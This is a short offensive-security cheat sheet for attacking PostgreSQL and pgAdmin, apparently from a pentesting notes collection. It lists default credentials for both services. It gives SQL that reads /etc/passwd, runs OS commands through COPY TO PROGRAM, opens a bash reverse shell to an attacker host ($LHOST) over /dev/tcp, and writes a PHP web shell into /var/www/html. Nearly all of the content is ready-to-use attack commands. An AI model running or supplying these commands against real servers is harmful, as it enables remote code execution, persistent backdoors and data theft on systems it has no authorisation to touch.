# PostgreSQL / pgAdmin

**What it is:** Powerful open-source relational database. Unlike MySQL, PostgreSQL supports native command execution via COPY TO PROGRAM (v9.3+), making it a direct path to RCE when accessible.

**Default ports:** 5432 (PostgreSQL), 5050 (pgAdmin)

**Vuln research:**
- [PostgreSQL Security](https://www.postgresql.org/support/security/)
- [SearchSploit: `searchsploit postgresql`](https://www.exploit-db.com/search?q=postgresql)

---


### Connect to PostgreSQL (port 5432)

Direct database access — Try default credentials

```bash
psql -h $IP -U postgres
# Default creds: postgres:postgres, postgres:(empty)
```

---

### Command execution via PostgreSQL

COPY TO/FROM PROGRAM — Execute OS commands

```sql
-- Read files:
CREATE TABLE readfile(output text);
COPY readfile FROM '/etc/passwd';
SELECT * FROM readfile;

-- Execute commands (PostgreSQL 9.3+):
COPY (SELECT '') TO PROGRAM 'id';

-- Reverse shell:
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1"';
```

---

### Write files via PostgreSQL

COPY TO — Write web shells

```sql
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

---

### pgAdmin default credentials

Web interface for PostgreSQL — Often exposed

```bash
# Default: pgadmin4@pgadmin.org / admin
# Check: http://$IP:5050 or http://$IP/pgadmin
```

---
